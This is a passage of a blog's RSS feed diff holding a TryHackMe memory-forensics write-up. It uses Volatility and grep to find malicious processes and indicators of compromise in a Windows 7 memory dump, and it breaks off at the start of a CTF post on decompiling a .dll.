+    &gt;Try Hack Me&amp;rsquo;s Forensics&lt;/a&gt; practice challenge. The task is to analyze a memory dump of a target system and find the malicious files. It largely focuses on identifying different IOC.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;task-1&#34;&gt;Task 1
+&lt;/h2&gt;&lt;h3 id=&#34;getting-started&#34;&gt;Getting Started
+&lt;/h3&gt;&lt;p&gt;My first instinct is to open up autopsy and pull the image into that program to analyze. Completely incorrect method. Well, not completely. I was able to see the hex dump of the image, but it was listing as two unallocated partitions that showed as deleted.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/victim-in-autopsy.png&#34;
+	width=&#34;720&#34;
+	height=&#34;354&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/victim-in-autopsy_hu6615383126371338041.png 480w, http://localhost:1313/p/forensics-using-volatility/victim-in-autopsy_hu7746855299507895947.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;This is what it looked like&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;203&#34;
+		data-flex-basis=&#34;488px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;My next go-to is going to be using binwalk to extract the file system. I executed &lt;code&gt;binwalk -e victim.raw&lt;/code&gt; to extract the data and other information. This seemed to be extracting something.&lt;/p&gt;
+&lt;p&gt;The first question was:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;What is the Operating System of this Dump file? (OS name)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This was pretty straight forward as the extracted files all were referencing the OS.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/showing-os.png&#34;
+	width=&#34;867&#34;
+	height=&#34;152&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/showing-os_hu15148400491427510130.png 480w, http://localhost:1313/p/forensics-using-volatility/showing-os_hu6798963205246644304.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Here is an example of where the OS was referenced&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;570&#34;
+		data-flex-basis=&#34;1368px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;digging-deeper&#34;&gt;Digging Deeper
+&lt;/h3&gt;&lt;p&gt;Extracting all those files via binwalk was unrealistic. I went back to Autopsy to see what options I had. Nothing still. It seemed to get stuck processing the image.&lt;/p&gt;
+&lt;p&gt;After researching other ways to analyze a memory dump, I ran into someone mentioning Volatility, which I vaguely remembered was good for analyzing system dumps. I also hadn&amp;rsquo;t paid attention to the room having the Volatility logo on it which would&amp;rsquo;ve saved me some time.&lt;/p&gt;
+&lt;p&gt;I hadn&amp;rsquo;t used it much up to this point, but I switched to a using Volatility. At first, I used Volatility Workbench.&lt;/p&gt;
+&lt;p&gt;This gave me the answer to the next question:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;What is the PID of SearchIndexer.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;In Volatility Workbench, there is an option to view processes once you specify the memory dump. So, I dumped the memory processes, which gave me all the processes on the target system.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/proccesses-list.png&#34;
+	width=&#34;715&#34;
+	height=&#34;393&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/proccesses-list_hu15649192347604938192.png 480w, http://localhost:1313/p/forensics-using-volatility/proccesses-list_hu2098123926504729295.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Here is was the processes list looked like&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;181&#34;
+		data-flex-basis=&#34;436px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;files-upon-files&#34;&gt;Files Upon Files&amp;hellip;
+&lt;/h3&gt;&lt;p&gt;In the meantime, my Autopsy scan was still running away. I decided to check up on that as it seemed some more files were uncovered as the image was being analyzed.&lt;/p&gt;
+&lt;p&gt;It showed a bunch of carved files, and a potentially malicious zip file, but nothing of importance. The real helper here would be Volatility.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/carved.png&#34;
+	width=&#34;1498&#34;
+	height=&#34;727&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/carved_hu1859101180031224459.png 480w, http://localhost:1313/p/forensics-using-volatility/carved_hu4148708545286126835.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Here is what Autopsy was showing me&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;206&#34;
+		data-flex-basis=&#34;494px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;The next question and last question of the first task was&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;What is the last directory accessed by the user.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Now, I&amp;rsquo;ve never used Volatility that much, much less the GUI version, so it took some messing with. After digging around, I managed to figure out that selecting the &lt;code&gt;windows.cmdline.CmdLine&lt;/code&gt; command and running that output some of the last commands executed.&lt;/p&gt;
+&lt;p&gt;That didn&amp;rsquo;t end up giving me what I needed. I decided to cave and just use Volatility in wsl. Volatility Workbench didn&amp;rsquo;t have everything on it I needed, plus it was based in Volatility 3 and I need Volatility 2 to run the shellbags plugin.&lt;/p&gt;
+&lt;p&gt;The shellbags plugin was supposed to give a list of accessed directories and their last access time, which would give me exactly what I needed.&lt;/p&gt;
+&lt;p&gt;Getting Volatility working is always a pain, especially when it&amp;rsquo;s Volatility 2. But I got it installed and working, and ran &lt;code&gt;vol.py -f victim.raw imageinfo&lt;/code&gt; to get the profile I should run.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/volatility-profile.png&#34;
+	width=&#34;1098&#34;
+	height=&#34;330&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/volatility-profile_hu17444467872235278850.png 480w, http://localhost:1313/p/forensics-using-volatility/volatility-profile_hu12922377535795468152.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;This was the output for running that command&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;332&#34;
+		data-flex-basis=&#34;798px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Then I ran &lt;code&gt;vol.py -f victim.raw --profile=&amp;lt;profile&amp;gt; shellbags&lt;/code&gt; to hopefully get the last accessed directory. The profile given for me to run was &lt;code&gt;Win7SP1x64&lt;/code&gt; so I ran &lt;code&gt;vol.py -f victim.raw --profile=Win7SP1x64 shellbags&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/shellbags-output.png&#34;
+	width=&#34;733&#34;
+	height=&#34;477&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/shellbags-output_hu8737139027612271929.png 480w, http://localhost:1313/p/forensics-using-volatility/shellbags-output_hu15817912649029364909.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Here is the output for running the shellbags plugin against the image&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;153&#34;
+		data-flex-basis=&#34;368px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s not sorted, obviously, so I did the same command but had it output to a text document. I was hoping to be able to put it into an excel spreadsheet. The command I did was &lt;code&gt;vol.py -f victim.raw --profile=Win7SP1x64 shellbags &amp;gt; access.txt&lt;/code&gt; (This took forever to run).&lt;/p&gt;
+&lt;p&gt;I decided to look through the output manually and just parse it out since there weren&amp;rsquo;t a whole lot, and I ended up finding the directory.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/shellbags-last-accessed.png&#34;
+	width=&#34;1101&#34;
+	height=&#34;273&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/shellbags-last-accessed_hu14802295084782932999.png 480w, http://localhost:1313/p/forensics-using-volatility/shellbags-last-accessed_hu6327837449283835280.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Here is where I found the listing for the last accessed directory&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;403&#34;
+		data-flex-basis=&#34;967px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;task-2&#34;&gt;Task 2
+&lt;/h2&gt;&lt;h3 id=&#34;netscan&#34;&gt;Netscan
+&lt;/h3&gt;&lt;p&gt;Next question is about malicious services on different ports, so I&amp;rsquo;ll be running &lt;code&gt;vol.py -f victim.raw --profile=Win7SP1x64 netscan&lt;/code&gt; to get the running services and their associated ports&lt;/p&gt;
+&lt;p&gt;I was pretty confused at first because I could tell which service was the malicious one, I got the PID of it, &lt;code&gt;2464&lt;/code&gt;, and the service was &lt;code&gt;wmpnetwk.exe&lt;/code&gt; as that&amp;rsquo;s not a typical service, but it&amp;rsquo;s listed a million different times.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/wmpnetwk.png&#34;
+	width=&#34;1092&#34;
+	height=&#34;481&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/wmpnetwk_hu1478260537105056053.png 480w, http://localhost:1313/p/forensics-using-volatility/wmpnetwk_hu11549894565849730128.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;As you can see, there are multiple listings of that service&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;227&#34;
+		data-flex-basis=&#34;544px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Eventually, I found it listed at the beginning of the services list, so I put that in and I guess it was right. Not entirely sure how that&amp;rsquo;s more right than the others.&lt;/p&gt;
+&lt;p&gt;My assumption is that specific one is correct because it&amp;rsquo;s the primary instance that that service is running from.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/netscan-result.png&#34;
+	width=&#34;1373&#34;
+	height=&#34;447&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/netscan-result_hu17147190146339257021.png 480w, http://localhost:1313/p/forensics-using-volatility/netscan-result_hu12883370454199770980.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Here is where I saw the correct port and protocol&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;307&#34;
+		data-flex-basis=&#34;737px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;vad-and-protection&#34;&gt;Vad and Protection
+&lt;/h3&gt;&lt;h4 id=&#34;confusion&#34;&gt;Confusion
+&lt;/h4&gt;&lt;p&gt;The next question stumped me. It was asking to use Vad tags and execution protection to find IOCs (indicators of compromise), however I wasn&amp;rsquo;t sure how to go about doing that. I tried doing vadinfo, vadtree, and vaddump, and I just didn&amp;rsquo;t seem to be getting good information.&lt;/p&gt;
+&lt;p&gt;I didn&amp;rsquo;t know what I was looking for at all was the issue. I didn&amp;rsquo;t know what certain vad tags or execution protection would indicate an issue.&lt;/p&gt;
+&lt;p&gt;This guide by &lt;a class=&#34;link&#34; href=&#34;https://www.eyehatemalwares.com/digital-forensics/memory-analysis/volatility-vadinfo/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;eyehatmalwares&lt;/a&gt; was incredibly helpful. I realized looking through this single guide what was being asked of me.&lt;/p&gt;
+&lt;p&gt;I still don&amp;rsquo;t entirely get what we are looking at with this stuff. I&amp;rsquo;m assuming it&amp;rsquo;s something to do with memory and ability to override what&amp;rsquo;s written in their processes or not, or what permission are allowed with that.&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;m still not entirely sure what Virtual Address Descriptors (Vad) are, so that&amp;rsquo;ll have to go into the backlog of things to research. But I had learned enough to get what I needed.&lt;/p&gt;
+&lt;h4 id=&#34;solution&#34;&gt;Solution
+&lt;/h4&gt;&lt;p&gt;My plan was to parse out the nodes with &lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt;. Then I would see if that process contained a MZ or PE file, or if it had a JMP, RET, or CALL instruction.&lt;/p&gt;
+&lt;p&gt;In reality, with this problem, the malicious processes were the only ones that had &lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;For some reason it the room wasn&amp;rsquo;t taking the PIDs in the order I was giving them. They had to be in a specific order to be considered correct.&lt;/p&gt;
+&lt;p&gt;The above method found the right PIDs, but the instructions implied a different method of solving, so I thought maybe I had gotten the wrong PIDs because I had used the wrong method, but that wasn&amp;rsquo;t the case.&lt;/p&gt;
+&lt;p&gt;The method that the challenge was implying wanted you to look for two things. If the node had a &lt;code&gt;Protection: *_EXECUTE_*&lt;/code&gt; in it, plus the Vad Tag was VadS.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/first-find-search.png&#34;
+	width=&#34;1468&#34;
+	height=&#34;709&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/first-find-search_hu3047120135640698108.png 480w, http://localhost:1313/p/forensics-using-volatility/first-find-search_hu5236170536559308470.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;This is an example of what they wanted you to search. You can see in the middle where I highlighted the proper VAD node with the VadS tag and an execute protection&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;207&#34;
+		data-flex-basis=&#34;496px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;The method where you solely look for &lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt; works much better since only the services that were malicious had that specific protection.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/execute-readwrite.png&#34;
+	width=&#34;1460&#34;
+	height=&#34;688&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/execute-readwrite_hu9279843065373541427.png 480w, http://localhost:1313/p/forensics-using-volatility/execute-readwrite_hu15373687776768670415.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Here you can see how narrowed down the search becomes, with only five instances of the PAGE_EXECUTE_READWRITE protection existing&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;212&#34;
+		data-flex-basis=&#34;509px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;There were a lot that had &lt;code&gt;PAGE_EXECUTE_WRITECOPY&lt;/code&gt; but weren&amp;rsquo;t under a malicious service, so parsing through each and keeping an eye on if it had an associated VadS tag was kind of tedious. Parsing out the &lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt; was a much faster method.&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;m assuming the required order had to do with the order the processes were listed as the order it required was the order in which the processes appeared on the report.&lt;/p&gt;
+&lt;p&gt;I was thoroughly confused on what was being referred to with the vad s tag and execute protection, but I&amp;rsquo;m glad I learned about this. It&amp;rsquo;s good to learn different IOC, and I&amp;rsquo;m glad to know this one and have seen it in practice.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;task-3&#34;&gt;Task 3
+&lt;/h2&gt;&lt;h3 id=&#34;websites&#34;&gt;Websites
+&lt;/h3&gt;&lt;p&gt;Next, I&amp;rsquo;m going to use my Volatility Workstation that has all the processes listed that were running at the time of the memory dump to look and see what services these PID are associated with. Then, I&amp;rsquo;ll research these services on virus total to find the next question answers.&lt;/p&gt;
+&lt;p&gt;(At least, that was my initial plan)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;In the previous task, you identified malicious processes, so let&amp;rsquo;s dig into them and find some Indicator of Compromise (IOC). You just need to find them and fill in the blanks (You may search for them on VirusTotal to discover more details).&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The first hint for the URL looks like this:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;lsquo;www.go****.ru&amp;rsquo; (write full URL without any quotation marks)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;wrong-direction&#34;&gt;Wrong Direction
+&lt;/h4&gt;&lt;p&gt;So, let&amp;rsquo;s go to virus total and do some digging. I am also doing a memdup of the specified PIDs since I think there are some questions about specifics within their memory. What I&amp;rsquo;m going to do is attempt to get a hash or something I can put into virus total and see what comes up.&lt;/p&gt;
+&lt;p&gt;I am using WinDBG to analyze the 1860.dmp file. I&amp;rsquo;m also going to dump the 1820 and 2464 processes.&lt;/p&gt;
+&lt;p&gt;I messed with these files for a while. I used a bunch of different tools said to be able to analyze .dmp files, but I defaulted back to volatility to see if I can dump all the files and maybe just pop them into virus total.&lt;/p&gt;
+&lt;p&gt;It took me way too long, but I found out that you can scan through the files and grep the service name file, and then download that specific file using the memory location.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/explorer.png&#34;
+	width=&#34;787&#34;
+	height=&#34;66&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/explorer_hu11410370584265761552.png 480w, http://localhost:1313/p/forensics-using-volatility/explorer_hu3358643737333255145.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Heres what was run and the output&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1192&#34;
+		data-flex-basis=&#34;2861px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;So to get the memory location of the explorer.exe file, I ran &lt;code&gt;vol.py -f victim.raw --profile=Win7SP1x64 filescan | grep explorer.exe&lt;/code&gt; and then I ran &lt;code&gt;vol.py -f victim.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000005c5596e0 --name file -D 1860-memdump/&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;right-direction&#34;&gt;Right Direction
+&lt;/h4&gt;&lt;p&gt;After dumping these process images and messing with them in IDA for a while, I decided to just try and parse through the strings. Sometimes things aren&amp;rsquo;t as complicated as we try to make them.&lt;/p&gt;
+&lt;p&gt;So, I went back to my terminal, and tried printing out the strings of each service and greping the question using wildcards.&lt;/p&gt;
+&lt;p&gt;I was looking up how to properly grep with wild cards, and you actually have to do &lt;code&gt;.*&lt;/code&gt; to mean any character since grep works with regular expressions.&lt;/p&gt;
+&lt;p&gt;I used &lt;code&gt;strings &amp;lt;service&amp;gt;.dmp | grep www.go.*.ru&lt;/code&gt;. I tried it on all the dump files and the only one that came up with any results was the service with PID of 1820.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/go-result.png&#34;
+	width=&#34;275&#34;
+	height=&#34;348&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/go-result_hu654835869961324499.png 480w, http://localhost:1313/p/forensics-using-volatility/go-result_hu626789756994933499.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;The output of that query&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;79&#34;
+		data-flex-basis=&#34;189px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;I did have to use a hint to figure out which one it might be as there were just way too many options. It seems like the hints just give you an idea as which site in the list of sites it might be. From that. I figured out which one was the correct URL.&lt;/p&gt;
+&lt;p&gt;Next question is:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;lsquo;www.i****.com&amp;rsquo; (write full URL without any quotation marks)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;So, I&amp;rsquo;m assuming that all the answers will be in the 1820 service, but if I couldn&amp;rsquo;t find them there I&amp;rsquo;d parse through the others as well. Next query looked like &lt;code&gt;strings 1820.dmp | grep www.i.*.com&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/i-result.png&#34;
+	width=&#34;473&#34;
+	height=&#34;457&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/i-result_hu4597706256267746876.png 480w, http://localhost:1313/p/forensics-using-volatility/i-result_hu13494881011300981915.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Here is the result after parsing through 1820s strings&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;103&#34;
+		data-flex-basis=&#34;248px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;The next hint wasn&amp;rsquo;t useful at all for me as I couldn&amp;rsquo;t tell which websites were related to the topic it gave me. There are also four characters after the &amp;lsquo;i&amp;rsquo; which helps us narrow it down a bit.&lt;/p&gt;
+&lt;p&gt;I had to use the amount of characters to figure it out since there was only one result with four letters after the &amp;lsquo;i&amp;rsquo;, so I went with that one.&lt;/p&gt;
+&lt;p&gt;Next:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;lsquo;www.ic******.com&amp;rsquo;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We already kind of got this one by doing the &amp;lsquo;i&amp;rsquo; wild card, but I&amp;rsquo;m going to rerun the query with the added &amp;lsquo;c&amp;rsquo; to narrow down the results so I don&amp;rsquo;t have to manually. In this one there should be six characters after the &amp;lsquo;ic&amp;rsquo;.&lt;/p&gt;
+&lt;p&gt;There was only one that fit that criteria, and it was the first result.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/ic-result.png&#34;
+	width=&#34;383&#34;
+	height=&#34;123&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/ic-result_hu7360740634972445229.png 480w, http://localhost:1313/p/forensics-using-volatility/ic-result_hu1679968806069617779.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Here are what that queries results looked like&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;311&#34;
+		data-flex-basis=&#34;747px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ip-addresses&#34;&gt;IP Addresses
+&lt;/h3&gt;&lt;p&gt;Now we move onto finding the different IP addresses. Since I know how to properly use grep wildcards, this should be easy-peasy.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;202.***.233.*** (Write full IP)&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;So I did &lt;code&gt;strings 1820.dmp | grep 202..*.233..*&lt;/code&gt; and only got one result back (thankfully).&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;***.200.**.164 (Write full IP)&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And again we do &lt;code&gt;strings 1820.dmp | grep .*.200..*.164&lt;/code&gt; which gives us the flag and&amp;hellip; this mess&amp;hellip;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/second-ip.png&#34;
+	width=&#34;1096&#34;
+	height=&#34;159&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/second-ip_hu4005208163394762688.png 480w, http://localhost:1313/p/forensics-using-volatility/second-ip_hu5913733713831547407.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;This was startling to see!&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;689&#34;
+		data-flex-basis=&#34;1654px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&amp;hellip; Anyway, onto the next and final IP address query.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;209.190.***.***&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;So, one last time, we do &lt;code&gt;strings 1820.dmp | grep 209.190..*..*&lt;/code&gt; which gives us this flag along with another weird URL.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/forensics-using-volatility/third-ip.png&#34;
+	width=&#34;464&#34;
+	height=&#34;60&#34;
+	srcset=&#34;http://localhost:1313/p/forensics-using-volatility/third-ip_hu12847627047245911863.png 480w, http://localhost:1313/p/forensics-using-volatility/third-ip_hu18270300220026707576.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Theyre looking up some weird stuff!&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;773&#34;
+		data-flex-basis=&#34;1856px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Now, the final question&amp;hellip;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;What is the unique environmental variable of PID 2464?&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I didn&amp;rsquo;t really know what a unique environmental variable was, so this was going to require some sleuthing.&lt;/p&gt;
+&lt;p&gt;Come to find out, volatility has a plugin exactly for that. It&amp;rsquo;s called &lt;em&gt;&lt;strong&gt;envars&lt;/strong&gt;&lt;/em&gt;, and you just need to pop in the command like all other plugins with volatility.&lt;/p&gt;
+&lt;p&gt;I used this command, &lt;code&gt;vol.py -f victim.raw --profile=Win7SP1x64 -p 2464 envars --silent&lt;/code&gt;, to look up the environmental variable for the 2464 process.&lt;/p&gt;
+&lt;p&gt;You have to do &lt;code&gt;--silent&lt;/code&gt; if you want the &lt;em&gt;unique&lt;/em&gt; variable for that process.&lt;/p&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion
+&lt;/h2&gt;&lt;p&gt;That&amp;rsquo;s it! That&amp;rsquo;s how I went through solving the Try Hack Me Forensics Challenge! It was a lot of fun and I learned a lot along the way. If you have any questions about any steps I took during this process, leave them in the commends, or shoot me a message.&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;m more than willing to answer questions when I can. If you made it this far, thank you for reading. I had a really fun time writing this up, and I&amp;rsquo;m really appreciative when people take the time to read what I put work into. So thank you!&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Crosslock</title>
+        <link>http://localhost:1313/p/crosslock/</link>
+        <pubDate>Tue, 16 Apr 2024 00:20:04 -0400</pubDate>
+        
+        <guid>http://localhost:1313/p/crosslock/</guid>
+        <description>&lt;img src="http://localhost:1313/p/crosslock/decompiler.png" alt="Featured image of post Crosslock" /&gt;&lt;h2 id=&#34;uintrou&#34;&gt;&lt;u&gt;Intro&lt;/u&gt;
+&lt;/h2&gt;&lt;p&gt;So, I need to be vaguer about this write-up, but I wanted to put out something regarding a recent competition I did. It was a lot of fun. How I did was significantly better than it had been. I went from getting 717th place to 244th place. So that means I met my goal this year!! Anyway, I&amp;rsquo;m going to do a quick write-up of one of their sections.&lt;/p&gt;
+&lt;p&gt;This section was under their &amp;ldquo;Enumeration and Exploitation&amp;rdquo; category. It was the medium challenge and was indeed quite the challenge. I want to write about this one because I had to write some Python scripts for it, which I found to be a lot of fun.&lt;/p&gt;
+&lt;h2 id=&#34;umethodologyu&#34;&gt;&lt;u&gt;Methodology&lt;/u&gt;
+&lt;/h2&gt;&lt;p&gt;This one involved a .dll file that we had to find the flag within. The whole point was to try to &amp;ldquo;unlock&amp;rdquo; the program. Figure out how to view the code and get into the thing. This was a whole process not only to do but to figure out &lt;em&gt;how&lt;/em&gt; to do it.&lt;/p&gt;
+&lt;h3 id=&#34;how&#34;&gt;How?
+&lt;/h3&gt;&lt;p&gt;My first thought was to try to run it, but I was worried about running a .dll on my device, for obvious reasons (still tried to though&amp;hellip; do not recommend it&amp;hellip; nothing happened it&amp;rsquo;s just a stupid idea). So, after going to other problems for a while, I came back to this one. After looking up &amp;ldquo;how to open .dll&amp;rdquo; and things like that, I eventually figured out that you needed to use a decompiler to look at the .dll code. So, I started looking up decompilers and eventually found a couple of opens. The main one I used was a JetBrains based decompiler called &lt;a class=&#34;link&#34; href=&#34;https://www.jetbrains.com/decompiler/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;dotPeek&lt;/a&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;taking-action&#34;&gt;Taking Action
+&lt;/h3&gt;&lt;p&gt;Once I got all that up and running, I opened the .dll in the decompiler and started digging around. This is what I saw:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/crosslock/decompiler.png&#34;
+	width=&#34;1019&#34;
+	height=&#34;769&#34;
+	srcset=&#34;http://localhost:1313/p/crosslock/decompiler_hu9697201512961060961.png 480w, http://localhost:1313/p/crosslock/decompiler_hu11672442361879305685.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;.dll in DotPeek decompiler&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;132&#34;
+		data-flex-basis=&#34;318px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;I then clicked the dropdown next to the crosslock app and one function &lt;em&gt;immediately&lt;/em&gt; stuck out to me.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/crosslock/securelock.png&#34;
+	width=&#34;306&#34;
+	height=&#34;235&#34;
+	srcset=&#34;http://localhost:1313/p/crosslock/securelock_hu3263772355609296365.png 480w, http://localhost:1313/p/crosslock/securelock_hu9995482378265093650.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Securelock function&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;130&#34;
+		data-flex-basis=&#34;312px&#34;
+	
